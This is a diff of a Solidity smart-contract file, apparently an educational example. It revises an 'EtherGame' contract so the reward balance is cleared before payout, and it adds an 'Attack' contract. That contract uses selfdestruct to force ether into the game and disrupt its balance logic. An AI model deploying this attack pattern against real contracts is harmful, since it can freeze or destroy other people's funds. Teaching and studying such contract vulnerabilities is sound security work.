@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
+pragma solidity ^0.8.23;
 
 contract EtherGame {
-    uint public targetAmount = 3 ether;
-    uint public balance;
+    uint256 public targetAmount = 7 ether;
+    uint256 public balance;
     address public winner;
 
     function deposit() public payable {
@@ -20,7 +20,23 @@ contract EtherGame {
     function claimReward() public {
         require(msg.sender == winner, "Not winner");
 
-        (bool sent, ) = msg.sender.call{value: balance}("");
+        uint256 balanceToBeSent = balance;
+        balance = 0;
+
+        (bool sent,) = msg.sender.call{value: balanceToBeSent}("");
         require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
     }
 }
